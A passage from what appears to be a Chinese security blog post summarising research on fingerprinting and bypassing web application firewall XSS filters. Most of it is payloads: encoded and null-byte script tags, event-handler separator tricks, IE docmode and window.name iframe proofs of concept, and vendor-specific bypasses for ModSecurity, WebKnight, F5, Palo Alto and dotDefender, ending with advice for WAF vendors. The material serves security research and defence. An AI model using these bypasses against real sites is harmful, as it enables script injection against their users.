<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">∀㸀㰀script㸀alert(<span class="number">1</span>)㰀/script㸀</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//xsst.sinaapp.com/utf-32-1.php?charset=utf-32&amp;v=%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80</span></span><br></pre></td></tr></table></figure>
<p><strong>空字节</strong></p>
<p>最长用来绕过mod_security防火墙，形式如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;scri%<span class="number">00</span>pt&gt;alert(<span class="number">1</span>);&lt;/scri%00pt&gt;</span><br><span class="line"></span><br><span class="line">&lt;scri\x00pt&gt;alert(1);&lt;/scri%00pt&gt;</span><br><span class="line">&lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;/s%00c%00r%00%00ip%00t&gt;</span><br></pre></td></tr></table></figure>
<p>空字节只适用于PHP 5.3.8以上的版本</p>
<p><strong>语法BUG</strong></p>
<p>RFC声明中节点名称不能是空格，以下的形式在javascript中不能运行</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>);&lt;/script&gt;</span><br><span class="line">&lt;%<span class="number">0</span>ascript&gt;alert(<span class="number">1</span>);&lt;/script&gt;</span><br><span class="line">&lt;%<span class="number">0</span>bscript&gt;alert(<span class="number">1</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>&lt;%, &lt;//, &lt;!,&lt;?可以被解析成&lt;，所以可以使用以下的payload</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="comment">//     style=x:expression\28write(1)\29&gt; // Works upto IE7</span></span><br></pre></td></tr></table></figure>
<p>参考<a href="http://html5sec.org/#71" target="_blank" rel="noopener">http://html5sec.org/#71</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--[<span class="keyword">if</span>]&gt;&lt;script&gt;alert(1)&lt;/script     --&gt; // Works upto IE9</span><br></pre></td></tr></table></figure>
<p>参考<a href="http://html5sec.org/#115" target="_blank" rel="noopener">http://html5sec.org/#115</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml-stylesheet     type=<span class="string">"text/css"</span>?&gt;&lt;root     style="x:expression(write(1))"/&gt; // Works in IE7</span><br></pre></td></tr></table></figure>
<p>参考 <a href="http://html5sec.org/#77" target="_blank" rel="noopener">http://html5sec.org/#77</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%div%<span class="number">20</span>style=xss:expression(prompt(<span class="number">1</span>))&gt;     <span class="comment">// Works Upto IE7</span></span><br></pre></td></tr></table></figure>
<p><strong>Unicode分隔符</strong></p>
<p>[on\w+\s*]这个规则过滤了所有on事件，为了验证每个浏览器中有效的分隔符，可以使用fuzzing方法测试0×00到0xff，结果如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">IExplorer=     [<span class="number">0x09</span>,<span class="number">0x0B</span>,<span class="number">0x0C</span>,<span class="number">0x20</span>,<span class="number">0x3B</span>]</span><br><span class="line">Chrome =     [<span class="number">0x09</span>,<span class="number">0x20</span>,<span class="number">0x28</span>,<span class="number">0x2C</span>,<span class="number">0x3B</span>]</span><br><span class="line">Safari = [<span class="number">0x2C</span>,<span class="number">0x3B</span>]</span><br><span class="line">FireFox=     [<span class="number">0x09</span>,<span class="number">0x20</span>,<span class="number">0x28</span>,<span class="number">0x2C</span>,<span class="number">0x3B</span>]</span><br><span class="line">Opera = [<span class="number">0x09</span>,<span class="number">0x20</span>,<span class="number">0x2C</span>,<span class="number">0x3B</span>]</span><br><span class="line">Android =     [<span class="number">0x09</span>,<span class="number">0x20</span>,<span class="number">0x28</span>,<span class="number">0x2C</span>,<span class="number">0x3B</span>]</span><br><span class="line">x0b在Mod_security中已经被过滤，绕过的方法：</span><br><span class="line">&lt;a/onmouseover[\x0b]=location=&amp;#039;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&amp;#039;&gt;rhainfosec</span><br></pre></td></tr></table></figure>
<p><strong>缺少X-frame选项</strong></p>
<p>通常会认为X-frame是用来防护点击劫持的配置，其实也可以防护使用iframe引用的xss漏洞</p>
<p><strong>Docmodes</strong></p>
<p>IE引入了doc-mode很长时间，提供给老版本浏览器的后端兼容性，有风险，攻击情景是黑客可以引用你站点的框架，他可以引入doc-mode执行css表达式</p>
<p>expression(open(alert(1)))</p>
<p>以下POC可以插入到IE7中</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"X-UA-Compatible"</span> content=<span class="string">"IE=EmulateIE7"</span> /&gt;</span><br><span class="line">&lt;iframesrc=<span class="string">"https://targetwebsite.com"</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>
<p><strong>Window.name欺骗</strong></p>
<p>情景：我们用iframe加载一个页面，我们可以控制窗口的名称，这里也可以执行javascript代码</p>
<p>POC</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">    &lt;iframesrc=&amp;#039;http://www.target.com?foo="xss  autofocus/AAAAA  onfocus=location=window.name//&amp;#039;</span><br><span class="line">name=<span class="string">"javascript:alert("</span>XSS<span class="string">")"</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
<p><strong>DOM型XSS</strong></p>
<p>服务器不支持过滤DOM型的XSS，因为DOM型XSS总是在客户端执行，看一个例子：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">vari=location.hash;</span><br><span class="line"><span class="built_in">document</span>.write(i);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>在一些情况下，反射型XSS可以转换成DOM型XSS：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.target.com/xss.php?foo=&lt;svg/onload=location=/java/.source+/script/.source+location.hash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.hash[3]//#:()</span></span><br></pre></td></tr></table></figure>
<p>上面的POC只在[.+都被允许的情况下适用，可以使用location.hash注入任何不允许的编码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Location.hash[<span class="number">1</span>] = :  <span class="comment">// Defined at the first position after     the hash.</span></span><br><span class="line">Location.hash[<span class="number">2</span>]= (  <span class="comment">// Defined at the second position after     the has</span></span><br><span class="line">Location.hash[<span class="number">3</span>] = ) <span class="comment">// Defined     at third position after the hash.</span></span><br></pre></td></tr></table></figure>
<p>如果有客户端过滤可能不适用</p>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p><strong>ModSecurity绕过</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;scri%<span class="number">00</span>pt&gt;confirm(<span class="number">0</span>);&lt;/scri%00pt&gt;</span><br><span class="line">&lt;a/onmouseover[\x0b]=location=&amp;#039;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&amp;#039;&gt;rhainfosec</span><br></pre></td></tr></table></figure>
<p>参考<a href="http://blog.spiderlabs.com/2013/09/modsecurity-xss-evasion-challenge-results.html" target="_blank" rel="noopener">http://blog.spiderlabs.com/2013/09/modsecurity-xss-evasion-challenge-results.html</a></p>
<p><strong>WEB KNIGHT绕过</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;isindex action=j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(<span class="number">1</span>) type=image&gt;</span><br><span class="line">&lt;marquee/onstart=confirm(<span class="number">2</span>)&gt;</span><br></pre></td></tr></table></figure>
<p><strong>F5 BIG IP ASM and Palo ALTO绕过</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=<span class="string">"javascript:alert(1)"</span>&gt;&lt;/table&gt; <span class="comment">//IE6或者低版本Opera</span></span><br><span class="line">“/&gt;&lt;marquee  onfinish=confirm(123)&gt;a&lt;/marquee&gt;</span><br></pre></td></tr></table></figure>
<p><strong>Dot Defender绕过</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=prompt(<span class="number">1</span>);&gt; </span><br><span class="line">&lt;isindex action=<span class="string">"javas&amp;tab;cript:alert(1)"</span> type=image&gt;</span><br><span class="line">&lt;marquee/onstart=confirm(<span class="number">2</span>)&gt;</span><br></pre></td></tr></table></figure>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>黑名单方式永远不是最好的解决办法，但是相对与白名单效率很高，对于WAF供应商来说，最好的实践如下：</p>
<p>1、开发者和管理员要注意WAF只能缓解攻击，并且针对已知的弱点的防护只是和源代码修复的方法打个时间差；</p>
<p>2、要保持WAF的规则库更新；</p>
<p>3、WAF可以配置参数限制，需要提供手册用于配置参数content-length最大最小长度，content-type类型，在入侵时进行告警；</p>
<p>4、如果WAF依据黑名单，要确保可以阻断已知的浏览器BUG，并且相应规则库要及时更新。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zdresearch.com/zdresearch-xss1-challenge-writeup/" target="_blank" rel="noopener">https://zdresearch.com/zdresearch-xss1-challenge-writeup/</a></p>
<p><a href="http://blog.spiderlabs.com/2013/09/modsecurity-xss-evasion-challenge-results.html" target="_blank" rel="noopener">http://blog.spiderlabs.com/2013/09/modsecurity-xss-evasion-challenge-results.html</a></p>
<p><a href="http://html5sec.org/" target="_blank" rel="noopener">http://html5sec.org</a></p>
<p><a href="https://cure53.de/xfo-clickjacking.pdf" target="_blank" rel="noopener">https://cure53.de/xfo-clickjacking.pdf</a></p>
<p><a href="http://resources.infosecinstitute.com/demystifying-html-5-attacks/" target="_blank" rel="noopener">http://resources.infosecinstitute.com/demystifying-html-5-attacks/</a></p>
<p><strong>来源：</strong>Modern Web Application Firewalls Fingerprinting and Bypassing XSS Filters</p>
<p><strong>原作者：</strong>RAFAY BALOCH,TANZIL JAFFERY</p>

      
    </div>
    
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2019/01/19/反弹shell姿势/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">&lt;</strong>
      <div class="article-nav-title">
        
          反弹shell姿势
        
      </div>
    </a>
  
  
    <a href="/2019/01/08/XSS游戏学习总结备忘录/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">XSS游戏学习总结备忘录</div>
      <strong class="article-nav-caption">&gt;</strong>
    </a>
  
</nav>

  
</article>


<div class="ds-share share" data-thread-key="XSS现代WAF规则探测及绕过技术" data-title="XSS现代WAF规则探测及绕过技术" data-url="http://www.7wawa.com/2019/01/09/XSS现代WAF规则探测及绕过技术/"  data-images="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1538294497334&amp;di=c419c13db1186d7f3f9372f2d0801beb&amp;imgtype=0&amp;src=http%3A%2F%2Fpic.qqtn.com%2Fup%2F2018-8%2F15350201492699003.jpg" data-content="XSS现代WAF规则探测及绕过技术">
    <div class="ds-share-inline">
      <ul  class="ds-share-icons-16">
      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
      </ul>
      <div class="ds-share-icons-more">
      </div>
    </div>
 </div>
 





</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2021 cike
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">


<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: false,
		isHome: false,
		isPost: true,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>
<script src="/js/main.js"></script>



<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>